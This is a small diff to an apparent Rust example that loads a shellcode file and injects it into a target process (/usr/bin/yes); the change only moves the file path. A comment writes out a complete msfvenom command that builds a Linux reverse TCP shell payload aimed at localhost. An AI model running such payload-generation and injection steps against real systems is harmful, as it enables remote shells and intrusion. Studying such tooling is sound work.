@@ -8,8 +8,9 @@ fn main() {
 
     // Shellcode:
     // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
+    let shellcode = format!("{}/examples/shellcode.bin", cwd);
 
-    let payload = Payload::from_file(&format!("{}/shellcode.bin", cwd), PayloadType::Executable)
+    let payload = Payload::from_file(&shellcode, PayloadType::Executable)
         .set_target("/usr/bin/yes")
         .set_target_args("YES");
 
